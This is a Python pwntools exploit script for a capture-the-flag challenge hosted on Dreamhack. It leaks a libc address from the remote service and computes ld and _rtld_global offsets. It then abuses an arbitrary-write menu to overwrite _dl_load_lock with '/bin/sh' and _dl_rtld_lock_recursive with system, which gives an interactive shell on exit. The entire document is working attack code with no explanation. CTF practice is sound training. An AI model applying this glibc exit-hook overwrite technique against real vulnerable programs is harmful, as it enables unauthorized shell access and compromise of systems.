#!/usr/bin/env python3 

from pwn import *
elf = ELF('./vuln')
ld = ELF('./ld-2.27.so')
libc = ELF('./libc.so.6')
# p = elf.process()
# gdb.attach(p, '''

# 	''')
p = remote('host3.dreamhack.games', '19318')

# peda
# p &_rtld_global._dl_load_lock
# p &_rtld_global._dl_rtld_lock_recursive
p.recvuntil(b": ")
stdout = int(p.recvuntil(b"\n"),16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000
rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840
system = libc_base + libc.symbols['system']
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"addr: ", str(dl_load_lock).encode())
p.sendlineafter(b"data: ", str(u64("/bin/sh\x00")).encode())
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"addr: ", str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b"data: ", str(system).encode())
p.sendlineafter(b"> ", b"2")


p.interactive()
